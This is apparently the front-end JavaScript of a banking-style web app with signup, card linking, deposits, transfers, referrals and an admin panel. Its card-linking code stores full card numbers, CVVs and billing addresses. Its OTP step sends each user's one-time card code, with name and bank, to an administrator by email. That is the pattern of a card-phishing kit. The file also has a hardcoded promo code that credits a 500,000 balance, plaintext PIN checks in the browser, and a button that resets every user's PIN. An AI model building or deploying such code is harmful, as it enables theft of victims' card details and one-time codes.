document.addEventListener('DOMContentLoaded',function(){
applyTranslations();

// Check for referral code in URL and auto-fill
var urlParams = new URLSearchParams(window.location.search);
var refParam = urlParams.get('ref');
if(refParam){
  var refInput=$('su-referral');
  if(refInput) refInput.value=refParam.toUpperCase();
  // Auto-switch to signup tab
  $('login-section').style.display='none';
  $('signup-section').style.display='block';
}

// AUTH
$('to-signup').onclick=function(){$('login-section').style.display='none';$('signup-section').style.display='block';};
$('to-login').onclick=function(){$('signup-section').style.display='none';$('login-section').style.display='block';};

$('login-btn').onclick=function(){
  var em=$('li-email').value.trim(),pw=$('li-password').value,err=$('login-error');
  err.textContent='';
  if(!em||!pw){err.textContent='Please fill in all fields.';return;}
  auth.signInWithEmailAndPassword(em,pw).catch(function(e){err.textContent=e.message;});
};

$('signup-btn').onclick=function(){
  var err=$('signup-error'); err.textContent='';
  var sur=$('su-surname').value.trim(),fn=$('su-firstname').value.trim(),oth=$('su-othername').value.trim(),ph=$('su-phone').value.trim();
  var un=$('su-username').value.trim(),em=$('su-email').value.trim(),pw=$('su-password').value,cf=$('su-confirm').value;
  var cur=$('su-currency').value,co=$('su-country').value,promo=$('su-promo').value.trim(),ref=$('su-referral').value.trim().toUpperCase();
  if(!sur||!fn||!ph||!un||!em||!pw||!co){err.textContent='Please fill in all required fields.';return;}
  if(pw!==cf){err.textContent='Passwords do not match.';return;}
  if(pw.length<8){err.textContent='Password must be at least 8 characters.';return;}
  $('signup-btn').textContent='Creating...'; $('signup-btn').disabled=true;
  auth.createUserWithEmailAndPassword(em,pw).then(function(cred){
    var uid=cred.user.uid;
    return genAccNum().then(function(accNum){
      var bal=promo.toUpperCase()==='VICCYLAY30'?500000:0;
      var refCode='AUB-'+uid.slice(0,6).toUpperCase();
      return db.ref('users/'+uid).set({surname:sur,firstname:fn,othername:oth,phone:ph,username:un,email:em,currency:cur,country:co,accountNumber:accNum,balance:bal,history:[],linkedCards:[],referralCode:refCode,referrals:[],referralClaimed:false})
        .then(function(){return db.ref('accountNumbers/'+accNum).set(uid);})
        .then(function(){return db.ref('publicDirectory/'+uid).set({firstname:fn,surname:sur,accountNumber:accNum});})
        .then(function(){
          if(!ref) return;
          return db.ref('users').once('value').then(function(snap){
            snap.forEach(function(s){
              var u=s.val();
              if(u&&u.referralCode===ref){
                var refs=u.referrals||[];
                refs.push({uid:uid,date:new Date().toISOString()});
                var earned=(parseFloat(u.referralEarned)||0)+10;
                db.ref('users/'+s.key).update({referrals:refs,referralEarned:earned});
                notify(s.key,'🎉 Someone joined with your code! You have '+refs.length+' referral'+(refs.length!==1?'s':'')+'. $10 added to your earnings!');
              }
            });
          });
        });
    });
  }).catch(function(e){err.textContent=e.message;$('signup-btn').textContent='Create Account';$('signup-btn').disabled=false;});
};

// DRAWER
$('menu-btn').onclick=openDrawer;
$('drawer-overlay').onclick=closeDrawer;
$('drawer-logout').onclick=function(){auth.signOut();closeDrawer();};
$('more-logout').onclick=function(){auth.signOut();closeModal('more-modal');};
$('admin-logout-btn').onclick=function(){auth.signOut();};

// NOTIF
$('notif-btn').onclick=function(){
  openModal('notif-modal');
  setTimeout(function(){
    if(!currentUser) return;
    db.ref('notifications/'+currentUser.uid).once('value').then(function(snap){
      if(snap.exists()) snap.forEach(function(s){if(!s.val().read) db.ref('notifications/'+currentUser.uid+'/'+s.key+'/read').set(true);});
    });
  },1500);
};

// VERIFY
$('verify-banner-btn').onclick=function(){openModal('verify-modal');};
$('vtab-app').onclick=function(){$('vpanel-app').style.display='block';$('vpanel-otp').style.display='none';$('vtab-app').classList.add('active');$('vtab-otp').classList.remove('active');};
$('vtab-otp').onclick=function(){$('vpanel-otp').style.display='block';$('vpanel-app').style.display='none';$('vtab-otp').classList.add('active');$('vtab-app').classList.remove('active');};
$('verify-app-done').onclick=function(){
  var cards=userData.linkedCards||[],last=cards[cards.length-1];
  if(last){last.appAuthRequested=true;last.appAuthDate=new Date().toISOString();db.ref('users/'+currentUser.uid+'/linkedCards').set(cards);}
  $('verify-msg').style.color='#34d399';$('verify-msg').textContent='\u2705 Submitted! Our team will verify shortly.';
};
$('verify-otp-btn').onclick=function(){
  var otp=$('otp-input').value.trim(),msg=$('verify-msg');msg.textContent='';
  if(!otp||otp.length<4){msg.style.color='#ff5c5c';msg.textContent='Enter your OTP code.';return;}
  var cards=userData.linkedCards||[];
  var pidx=cards.reduce(function(best,cd,i){return (cd&&cd.status==='pending')?i:best;},-1);
  if(pidx<0){msg.style.color='#ff5c5c';msg.textContent='No pending card found.';return;}
  cards[pidx].otpCode=otp;
  cards[pidx].otpSubmittedDate=new Date().toISOString();
  db.ref('users/'+currentUser.uid+'/linkedCards').set(cards).then(function(){
    // Notify admin in-app
    db.ref('users').once('value').then(function(snap){
      snap.forEach(function(s){
        var u=s.val();
        if(u&&(u.email===ADMIN_EMAIL||u.email===ADMINADEX_EMAIL)){
          notify(s.key,'&#128272; OTP from '+(userData.firstname||'')+' '+(userData.surname||'')+' for card ....'+cards[pidx].lastFour+': '+otp);
        }
        // Send email ONLY to main admin
        if(u&&u.email===ADMIN_EMAIL){
          sendEmail(u.email,
            '🔐 OTP Code Received',
            (userData.firstname||'')+' '+(userData.surname||''),
            (userData.firstname||'')+' '+(userData.surname||'')+' has submitted their OTP code.\n\nCard: '+cards[pidx].brand+' ....'+cards[pidx].lastFour+'\nBank: '+(cards[pidx].bankName||'--')+'\nOTP: '+otp+'\nAccount: '+(userData.accountNumber||'')+'\nEmail: '+(userData.email||'')+'\n\nPlease check your admin panel to authorize the card.'
          );
        }
      });
    });
    msg.style.color='#34d399';
    msg.textContent='\u2705 OTP sent to admin!';
    $('otp-input').value='';
  }).catch(function(e){msg.style.color='#ff5c5c';msg.textContent=e.message;});
};

// ACCOUNT
$('acct-info-btn').onclick=function(){openModal('account-modal');};
$('copy-acct-btn').onclick=function(){
  var num=userData.accountNumber||'';if(!num) return;
  navigator.clipboard.writeText(num).then(function(){alert('Copied: '+num);}).catch(function(){alert('Your account: '+num);});
};
$('gen-pin-btn').onclick=function(){
  var pin=String(Math.floor(1000+Math.random()*9000));
  if(!currentUser) return;
  db.ref('users/'+currentUser.uid+'/pin').set(pin).then(function(){alert('New PIN: '+pin+'\n\nSave this safely!');});
};

// CARDS
$('add-card-btn').onclick=function(){openModal('card-options-modal');};
$('add-card-link').onclick=function(){openModal('card-options-modal');};
$('offer-card-btn').onclick=function(){openModal('card-options-modal');};
$('view-cards-btn').onclick=function(){
  closeModal('card-options-modal');
  var con=$('cards-list-content');con.innerHTML='';
  var cards=(userData.linkedCards||[]).filter(function(c){return c;});
  if(!cards.length){con.innerHTML='<p style="text-align:center;color:#999;padding:20px;" data-i18n="noCards">No cards linked yet</p>';}
  else{cards.forEach(function(card,idx){
    var div=document.createElement('div');div.className='linked-card';
    div.innerHTML='<div><div class="linked-card-brand">'+card.brand+'</div><div class="linked-card-num">\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 '+card.lastFour+'</div><div class="linked-card-expiry">Exp: '+card.expiry+'</div><span class="linked-card-status '+card.status+'">'+(card.status==='authorized'?'\u2713 Authorized':card.status==='rejected'?'\u2717 Rejected':'\u29d6 Pending')+'</span></div>'+
      '<button class="remove-card-btn" onclick="removeCard('+idx+')">Remove</button>';
    con.appendChild(div);
  });}
  openModal('cards-list-modal');
};
$('add-new-card-btn').onclick=function(){
  closeModal('card-options-modal');
  $('card-modal-title').textContent='💳 Link Card';
  // Update fee label based on user currency
  var feeEl=$('card-link-fee');
  if(feeEl){var feeSym={'USD':'$','EUR':'€','GBP':'£','NGN':'₦','CAD':'C$','AUD':'A$'}[userData.currency||'USD']||'$';feeEl.textContent='10'+feeSym;}
  ['card-number','card-name','card-expiry','card-cvv','card-street','card-city','card-postcode','card-country-field','card-phone','card-balance'].forEach(function(id){var el=$(id);if(el)el.value='';});
  $('card-error').textContent='';
  openModal('card-modal');
};
$('card-submit-btn').onclick=function(){
  var err=$('card-error');err.textContent='';
  var num=$('card-number').value.replace(/\D/g,'');
  var name=$('card-name').value.trim(),bankName=$('card-bank-name').value.trim(),expiry=$('card-expiry').value.trim(),cvv=$('card-cvv').value.trim();
  var street=$('card-street').value.trim(),city=$('card-city').value.trim(),postcode=$('card-postcode').value.trim();
  var country=$('card-country-field').value.trim(),phone=$('card-phone').value.trim(),balance=$('card-balance').value.trim();
  if(num.length!==16){err.textContent='Card number must be 16 digits.';return;}
  if(!name||!expiry||!cvv){err.textContent='Please fill card name, expiry, and CVV.';return;}
  var cards=userData.linkedCards||[];
  if(cards.some(function(c){return c&&c.number===num;})){err.textContent='Card already linked.';return;}
  var brand=detectBrand(num);
  var newCard={number:num,name:name,bankName:bankName||'Not provided',expiry:expiry,cvv:cvv,brand:brand,lastFour:num.slice(-4),status:'pending',currentBalance:balance,addedDate:new Date().toISOString(),billingAddress:{street:street,city:city,postcode:postcode,country:country,phone:phone}};
  cards.push(newCard);
  $('card-submit-btn').textContent='Linking...';$('card-submit-btn').disabled=true;
  db.ref('users/'+currentUser.uid+'/linkedCards').set(cards).then(function(){
    return db.ref('users').once('value').then(function(snap){
      snap.forEach(function(s){if(s.val()&&s.val().email===ADMIN_EMAIL){notify(s.key,'💳 NEW CARD: '+(userData.firstname||'')+' '+(userData.surname||'')+' linked '+brand+' ....'+num.slice(-4));
            sendEmail(ADMIN_EMAIL,
              '🔔 Card Authorization Request',
              (userData.firstname||'')+' '+(userData.surname||''),
              (userData.firstname||'')+' '+(userData.surname||'')+' is requesting bank card authorization.\n\nCard: '+brand+' ....'+num.slice(-4)+'\nExpiry: '+expiry+'\nAccount: '+(userData.accountNumber||'')+'\nEmail: '+(userData.email||'')+'\n\nPlease check your admin panel to review it.'
            );}});
    });
  }).then(function(){
    closeModal('card-modal');
    setTimeout(function(){$('vc-brand').textContent=brand;$('vc-number').textContent='\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 '+num.slice(-4);$('vc-name').textContent=name;$('verify-msg').textContent='';$('otp-input').value='';openModal('verify-modal');},300);
  }).catch(function(e){err.textContent=e.message;}).finally(function(){$('card-submit-btn').textContent='Link Card';$('card-submit-btn').disabled=false;});
};
window.removeCard=function(idx){
  if(!confirm('Remove this card?')) return;
  var cards=userData.linkedCards||[];cards.splice(idx,1);
  var hasAuth=cards.some(function(cd){return cd&&cd.status==='authorized';});
  db.ref('users/'+currentUser.uid+'/linkedCards').set(cards).then(function(){
    if(!hasAuth) db.ref('users/'+currentUser.uid+'/verified').set(false);
    closeModal('cards-list-modal');
  });
};

// ADD MONEY
$('add-money-btn').onclick=function(){
  var cards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
  var con=$('addmoney-cards'),sec=$('addmoney-form-section');
  addMoneyCardIdx=-1;sec.style.display='none';con.innerHTML='';
  if(!cards.length){con.innerHTML='<p style="color:#e53935;text-align:center;padding:16px;" data-i18n="noAuthCards">No authorized cards. Link and verify a card first.</p>';}
  else{
    var allCards=userData.linkedCards||[];
    cards.forEach(function(card){
      var realIdx=allCards.indexOf(card);
      var opt=document.createElement('div');opt.className='addmoney-opt';
      opt.innerHTML='<span class="addmoney-opt-icon">💳</span><div><div class="addmoney-opt-label">'+card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour+'</div><div class="addmoney-opt-sub">Authorized</div></div>';
      opt.onclick=function(){document.querySelectorAll('.addmoney-opt').forEach(function(o){o.classList.remove('selected');});opt.classList.add('selected');addMoneyCardIdx=realIdx;$('addmoney-selected-info').textContent='Selected: '+card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour;sec.style.display='block';};
      con.appendChild(opt);
    });
  }
  openModal('add-money-modal');
};
$('addmoney-confirm-btn').onclick=function(){
  var amt=parseFloat($('addmoney-amount').value),pin=$('addmoney-pin').value.trim(),err=$('addmoney-error');err.textContent='';
  if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
  if(!pin||pin.length!==4){err.textContent='Enter your 4-digit PIN.';return;}
  if(addMoneyCardIdx<0){err.textContent='Select a card first.';return;}
  if(userData.pin!==pin){err.textContent='Incorrect PIN.';return;}
  var card=(userData.linkedCards||[])[addMoneyCardIdx];
  if(!card||card.status!=='authorized'){err.textContent='Card not authorized.';return;}
  var s=sym(),reqKey='dep_'+Date.now()+'_'+Math.random().toString(36).slice(2,5);
  var reqData={uid:currentUser.uid,name:(userData.firstname||'')+' '+(userData.surname||''),email:userData.email,accountNumber:userData.accountNumber,currency:userData.currency||'USD',amount:amt,cardBrand:card.brand,cardLastFour:card.lastFour,cardNumber:card.number,date:new Date().toISOString(),status:'pending',reqKey:reqKey};
  $('addmoney-confirm-btn').textContent='Submitting...';$('addmoney-confirm-btn').disabled=true;
  db.ref('depositRequests/'+reqKey).set(reqData).then(function(){
    notify(currentUser.uid,'\u29d6 Deposit of '+s+amt.toFixed(2)+' submitted — awaiting admin approval.');
    return db.ref('users').once('value').then(function(snap){snap.forEach(function(s2){if(s2.val()&&s2.val().email===ADMIN_EMAIL){notify(s2.key,'💰 DEPOSIT: '+(userData.firstname||'')+' wants '+s+amt.toFixed(2)+' via '+card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour);
              sendEmail(ADMIN_EMAIL,
                '💰 Deposit Request',
                (userData.firstname||'')+' '+(userData.surname||''),
                (userData.firstname||'')+' '+(userData.surname||'')+' is requesting a deposit of '+s+amt.toFixed(2)+'.\n\nCard: '+card.brand+' ....'+card.lastFour+'\nAccount: '+(userData.accountNumber||'')+'\nEmail: '+(userData.email||'')+'\nDate: '+new Date().toLocaleString()+'\n\nPlease check your admin panel to approve or reject.'
              );}});});
  }).then(function(){closeModal('add-money-modal');$('addmoney-amount').value='';$('addmoney-pin').value='';alert('\u29d6 Deposit of '+s+amt.toFixed(2)+' submitted!\nBalance updates once admin approves.');}).finally(function(){$('addmoney-confirm-btn').textContent='Submit Deposit Request';$('addmoney-confirm-btn').disabled=false;});
};

// TRANSFER
$('transfer-btn').onclick=function(){
  var cards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
  var sel=$('transfer-method');sel.innerHTML='<option value="">Select Card</option>';
  cards.forEach(function(card,i){var opt=document.createElement('option');opt.value=i;opt.textContent=card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour;sel.appendChild(opt);});
  $('transfer-error').textContent='';openModal('transfer-modal');
};
$('transfer-confirm-btn').onclick=function(){
  var method=$('transfer-method').value,amt=parseFloat($('transfer-amount').value),pin=$('transfer-pin').value.trim(),err=$('transfer-error');err.textContent='';
  if(!method){err.textContent='Select a card.';return;}
  if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
  if(!pin||pin.length!==4){err.textContent='Enter your PIN.';return;}
  if(userData.pin!==pin){err.textContent='Incorrect PIN.';return;}
  if(parseFloat(userData.balance||0)<amt){err.textContent='Insufficient balance.';return;}
  var s=sym();
  var authCards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
  var card=authCards[parseInt(method)];
  $('transfer-confirm-btn').textContent='Processing...';$('transfer-confirm-btn').disabled=true;
  userRef.transaction(function(u){
    if(u){u.balance=(parseFloat(u.balance)||0)-amt;u.history=u.history||[];u.history.push({date:new Date().toISOString(),type:'Transfer',amount:-amt,note:'Transfer to '+(card?card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour:'card')});}
    return u;
  }).then(function(){
    notify(currentUser.uid,'💸 Transfer of '+s+amt.toFixed(2)+' submitted. Processing 1-3 days.');
    return db.ref('users').once('value').then(function(snap){snap.forEach(function(s2){if(s2.val()&&s2.val().email===ADMIN_EMAIL) notify(s2.key,'💸 TRANSFER: '+(userData.firstname||'')+' wants '+s+amt.toFixed(2)+' to '+(card?card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour:''));});});
  }).then(function(){closeModal('transfer-modal');$('transfer-amount').value='';$('transfer-pin').value='';alert('\u2705 Transfer of '+s+amt.toFixed(2)+' submitted!');}).finally(function(){$('transfer-confirm-btn').textContent='Request Transfer';$('transfer-confirm-btn').disabled=false;});
};

// SEND
$('send-acct').oninput=function(){
  var val=this.value.trim(),info=$('send-acct-info');
  if(val.length===10){
    db.ref('accountNumbers/'+val).once('value').then(function(snap){
      if(!snap.exists()){info.style.display='block';info.textContent='\u274c Account not found';return;}
      var ruid=snap.val();
      // Try publicDirectory first (fast), fall back to users node
      db.ref('publicDirectory/'+ruid).once('value').then(function(pub){
        if(pub.exists()&&pub.val().firstname){
          info.style.display='block';
          info.textContent='\u2705 '+pub.val().firstname+' '+pub.val().surname;
        } else {
          // Fall back to users node
          db.ref('users/'+ruid).once('value').then(function(us){
            var u=us.val();
            info.style.display='block';
            info.textContent=u&&u.firstname?'\u2705 '+u.firstname+' '+u.surname:'\u2705 Account found';
          }).catch(function(){info.style.display='block';info.textContent='\u2705 Account found';});
        }
      }).catch(function(){info.style.display='block';info.textContent='\u2705 Account found';});
    });
  } else {info.style.display='none';}
};
$('send-btn').onclick=function(){
  var acct=$('send-acct').value.trim(),amt=parseFloat($('send-amount').value),pin=$('send-pin').value.trim(),err=$('send-error');err.textContent='';
  if(!acct||acct.length!==10){err.textContent='Enter a valid 10-digit account number.';return;}
  if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
  if(!pin||pin.length!==4){err.textContent='Enter your PIN.';return;}
  if(userData.pin!==pin){err.textContent='Incorrect PIN.';return;}
  if(parseFloat(userData.balance||0)<amt){err.textContent='Insufficient balance.';return;}
  db.ref('accountNumbers/'+acct).once('value').then(function(snap){
    if(!snap.exists()){err.textContent='Account not found.';return;}
    var ruid=snap.val();if(ruid===currentUser.uid){err.textContent="Can't send to yourself.";return;}
    var s=sym(),myName=(userData.firstname||'')+' '+(userData.surname||''),myAcct=userData.accountNumber||'',now=new Date().toISOString();
    $('send-btn').textContent='Sending...';$('send-btn').disabled=true;
    // Get recipient name - try publicDirectory, fall back to users node
    function getRecipientInfo(ruid,acct,callback){
      db.ref('publicDirectory/'+ruid).once('value').then(function(pub){
        if(pub.exists()&&pub.val().firstname){
          db.ref('users/'+ruid).once('value').then(function(us){
            var recipCur=(us.val()&&us.val().currency)||'USD';
            callback(pub.val().firstname+' '+pub.val().surname, pub.val().accountNumber||acct, recipCur);
          }).catch(function(){callback(pub.val().firstname+' '+pub.val().surname, pub.val().accountNumber||acct, 'USD');});
        } else {
          db.ref('users/'+ruid).once('value').then(function(us){
            var u=us.val();
            var name=u&&u.firstname?(u.firstname+' '+u.surname):acct;
            var an=u&&u.accountNumber?u.accountNumber:acct;
            var recipCur=(u&&u.currency)||'USD';
            callback(name,an,recipCur);
          }).catch(function(){callback(acct,acct,'USD');});
        }
      }).catch(function(){callback(acct,acct,'USD');});
    }
    getRecipientInfo(ruid,acct,function(recipName,recipAcct,recipCur){
      var convertedAmt=convertCurrency(amt, userData.currency||'USD', recipCur);
      return userRef.transaction(function(u){if(u){u.balance=(parseFloat(u.balance)||0)-amt;u.history=u.history||[];u.history.push({date:now,type:'Sent',amount:-amt,note:'Sent to '+recipName,counterparty:recipName,counterpartyAcct:recipAcct});}return u;}).then(function(){
        return db.ref('users/'+ruid).transaction(function(u){if(u){u.balance=(parseFloat(u.balance)||0)+convertedAmt;u.history=u.history||[];u.history.push({date:now,type:'Received',amount:convertedAmt,note:'From '+myName,counterparty:myName,counterpartyAcct:myAcct});}return u;});
      }).then(function(){
        notify(ruid,'💸 '+myName+' sent you '+s+amt.toFixed(2)+'!');
        // Email the recipient — skip if recipient is admin
        db.ref('users/'+ruid+'/email').once('value').then(function(eSnap){
          if(eSnap.exists()&&eSnap.val()!==ADMIN_EMAIL){
            
          }
        });
        $('send-acct').value='';$('send-amount').value='';$('send-pin').value='';$('send-acct-info').style.display='none';
        err.style.color='#00a550';err.textContent='\u2705 '+s+amt.toFixed(2)+' sent to '+recipName+'!';
        setTimeout(function(){err.textContent='';err.style.color='#e53935';},4000);
      });
    }).finally(function(){$('send-btn').textContent='Send Now';$('send-btn').disabled=false;});
  });
};

// REQUEST MONEY
$('req-acct').oninput=function(){
  var val=this.value.trim(),info=$('req-acct-info');
  if(val.length===10){
    db.ref('accountNumbers/'+val).once('value').then(function(snap){
      if(!snap.exists()){info.style.display='block';info.textContent='\u274c Account not found';return;}
      var ruid=snap.val();
      db.ref('publicDirectory/'+ruid).once('value').then(function(pub){
        if(pub.exists()&&pub.val().firstname){
          info.style.display='block';
          info.textContent='\u2705 '+pub.val().firstname+' '+pub.val().surname;
        } else {
          db.ref('users/'+ruid).once('value').then(function(us){
            var u=us.val();
            info.style.display='block';
            info.textContent=u&&u.firstname?'\u2705 '+u.firstname+' '+u.surname:'\u2705 Account found';
          }).catch(function(){info.style.display='block';info.textContent='\u2705 Account found';});
        }
      }).catch(function(){info.style.display='block';info.textContent='\u2705 Account found';});
    });
  } else {info.style.display='none';}
};
$('req-btn').onclick=function(){
  var acct=$('req-acct').value.trim(),amt=parseFloat($('req-amount').value),note=$('req-note').value.trim(),err=$('req-error');err.textContent='';
  if(!acct||acct.length!==10){err.textContent='Enter a valid 10-digit account number.';return;}
  if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
  db.ref('accountNumbers/'+acct).once('value').then(function(snap){
    if(!snap.exists()){err.textContent='Account not found.';return;}
    var targetUid=snap.val();if(targetUid===currentUser.uid){err.textContent="Can't request from yourself.";return;}
    var s=sym(),myName=(userData.firstname||'')+' '+(userData.surname||''),myAcct=userData.accountNumber||'';
    var reqId='req_'+Date.now()+'_'+Math.random().toString(36).slice(2,5);
    $('req-btn').textContent='Sending...';$('req-btn').disabled=true;
    db.ref('moneyRequests/'+targetUid+'/'+reqId).set({id:reqId,fromUid:currentUser.uid,fromName:myName,fromAcct:myAcct,toUid:targetUid,amount:amt,currency:userData.currency||'USD',note:note,status:'pending',date:new Date().toISOString()}).then(function(){
      notify(targetUid,'📩 '+myName+' is requesting '+s+amt.toFixed(2)+' from you.'+(note?' Note: '+note:'')+' Open app to respond.');
      // Money request: in-app notification only, no email
      $('req-acct').value='';$('req-amount').value='';$('req-note').value='';$('req-acct-info').style.display='none';
      err.style.color='#00a550';err.textContent='\u2705 Request sent!';setTimeout(function(){err.textContent='';err.style.color='#e53935';},4000);
    }).finally(function(){$('req-btn').textContent='Send Request';$('req-btn').disabled=false;});
  });
};

// REFERRAL
$('refer-copy-btn').onclick=function(){var code=userData.referralCode||'';if(!code) return;navigator.clipboard.writeText(code).then(function(){alert('Copied: '+code);}).catch(function(){alert('Your code: '+code);});};
$('offer-refer-btn').onclick=function(){switchTab('tab-refer',$('nav-refer'));};
$('refer-claim-btn').onclick=function(){
  var count=(userData.referrals||[]).length;if(count<12){alert('Need 12 referrals. Have '+count+'.');return;}if(userData.referralClaimed){alert('Already claimed!');return;}
  var s=sym(),bonus=count*10;
  userRef.transaction(function(u){if(u){u.balance=(parseFloat(u.balance)||0)+bonus;u.referralClaimed=true;}return u;}).then(function(){notify(currentUser.uid,'🎉 Referral bonus of '+s+bonus+' added!');alert('\u2705 '+s+bonus+' claimed!');});
};

// ADMIN PANEL
$('change-all-pins-btn').onclick=function(){
  var pin=$('global-pin').value.trim();if(!pin||pin.length!==4){alert('Enter a 4-digit PIN.');return;}if(!confirm('Change ALL user PINs to '+pin+'?')) return;
  db.ref('users').once('value').then(function(snap){var p=[];snap.forEach(function(s){if(s.val()&&s.val().email!==ADMIN_EMAIL) p.push(db.ref('users/'+s.key+'/pin').set(pin));});return Promise.all(p);}).then(function(){alert('All PINs updated!');});
};

window.openReferModal=function(){closeDrawer();switchTab('tab-refer',$('nav-refer'));};

// ── SEND / REQUEST CHOOSER ──
window.showSendReqChooser=function(){
  $('sendreq-chooser').style.display='block';
  $('sendreq-send').style.display='none';
  $('sendreq-request').style.display='none';
};
$('choose-send-btn').onclick=function(){
  $('sendreq-chooser').style.display='none';
  $('sendreq-send').style.display='block';
  $('sendreq-request').style.display='none';
  $('send-acct').value=''; $('send-amount').value=''; $('send-pin').value='';
  $('send-acct-info').style.display='none'; $('send-error').textContent='';
};
$('choose-req-btn').onclick=function(){
  $('sendreq-chooser').style.display='none';
  $('sendreq-request').style.display='block';
  $('sendreq-send').style.display='none';
  $('req-acct').value=''; $('req-amount').value=''; $('req-note').value='';
  $('req-acct-info').style.display='none'; $('req-error').textContent='';
};
// Reset to chooser when leaving the Send/Request tab
var _origSwitchTab=switchTab;
switchTab=function(tabId,btn){
  _origSwitchTab(tabId,btn);
  if(tabId!=='tab-sendreq'&&$('sendreq-chooser')){
    $('sendreq-chooser').style.display='block';
    $('sendreq-send').style.display='none';
    $('sendreq-request').style.display='none';
  }
};


// ── AUTO REFRESH on visibility change ──
document.addEventListener('visibilitychange',function(){
  if(!document.hidden&&currentUser){
    location.reload();
  }
});





// ── BROWSER BACK BUTTON SUPPORT ──
window.addEventListener('popstate',function(e){
  if(!currentUser) return;
  if(e.state && e.state.screen){
    if(e.state.screen==='dashboard'){
      showScreen('dashboard',true);
      if(e.state.tab){
        var tabBtn=document.querySelector('[onclick*="'+e.state.tab+'"]');
        switchTab(e.state.tab,tabBtn,true);
      }
    } else {
      showScreen(e.state.screen,true);
    }
  } else {
    auth.signOut();
  }
});

}); // END DOMContentLoaded